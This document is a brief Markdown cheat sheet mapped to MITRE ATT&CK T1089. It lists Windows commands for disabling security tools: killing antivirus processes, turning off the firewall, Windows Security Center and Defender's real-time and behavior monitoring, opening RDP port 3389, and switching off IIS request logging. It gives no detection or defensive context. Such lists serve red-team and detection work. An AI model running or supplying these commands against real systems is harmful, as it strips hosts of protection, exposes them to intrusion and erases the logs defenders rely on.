# Disabling Security Tools

## MITRE ATT&CK Technique: [T1089](https://attack.mitre.org/wiki/Technique/T1089)

## Terminate Anti-Virus Processes
`Taskkill /F /IM avprocess.exe`

## Disable Firewall
`netsh firewall set opmode disable`

## Stop Windows Security Center
`net stop wscsvc`

## Add Local Firewall Rule Exceptions : Enable a Program
`netsh advfirewall firewall add rule name="My Application" dir=in action=allow program="C:\MyApp\MyApp.exe" enable=yes`

## Add Local Firewall Rule Exceptions : Enable a Port
`netsh advfirewall firewall add rule name="Open Remote Desktop" protocol=TCP dir=in localport=3389 action=allow`

## Disable The LAN Network Connection
`netsh interface set interface name="Local Area Connection" admin=disabled`

## Stop Windows Defender

### Windows 7/8
`net stop windefend`

### Windows 10
```
PS > Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
PS > Set-MpPreference -DisableIOAVProtection $true -Verbose
PS > Set-MpPreference -DisableBehaviorMonitoring $true -Verbose
PS > Set-MpPreference -DisableIntrusionPreventionSystem $true -Verbose
PS > Set-MpPreference -DisablePrivacyMode $true -Verbose
```

## Disable Default Web Site Logging IIS 7

### Disable Default Web Site Logging IIS 7
`%windir%\system32\inetsrv\appcmd.exe set config "Default Web Site" -section:system.webServer/httpLogging /dontLog:"True" /commit:apphost`

### Restart Default Web Site IIS 7
`%windir%\system32\inetsrv\appcmd.exe stop site /site.name:"Default Web Site" && %windir%\system32\inetsrv\appcmd.exe start site /site.name:"Default Web Site"`
